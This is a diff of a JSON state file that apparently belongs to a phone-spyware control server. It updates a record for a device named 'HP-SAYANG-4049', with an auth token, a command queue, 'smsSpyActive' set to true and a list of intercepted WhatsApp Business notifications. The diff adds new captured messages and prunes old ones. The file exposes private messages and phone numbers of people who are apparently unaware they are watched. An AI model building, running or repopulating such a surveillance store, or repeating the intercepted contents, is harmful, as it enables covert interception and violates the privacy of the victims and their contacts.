@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775632738258,
+    "lastSeen": 1775632741288,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "+62 815-2386-4283",
+        "content": "‎2 pesan baru",
+        "time": "08/04 14:19",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775632744236
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 815-2386-4283",
+        "content": "dataa gw sekarat",
+        "time": "08/04 14:19",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775632744143
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎3 pesan dari 2 chat",
+        "time": "08/04 14:18",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775632740645
+      },
       {
         "appName": "WA Business",
         "sender": "+62 815-2386-4283",
@@ -4302,30 +4326,6 @@
         "time": "08/04 13:52",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775631133901
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 851-2302-5715",
-        "content": "Iya 🗿",
-        "time": "08/04 13:52",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775631133633
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 851-2302-5715",
-        "content": "‎4 pesan baru",
-        "time": "08/04 13:50",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775631026411
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 851-2302-5715",
-        "content": "Beli kas no DP DP 🗿 harga 55k🗿",
-        "time": "08/04 13:50",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775631026273
       }
     ],
     "galleryPhotos": [],
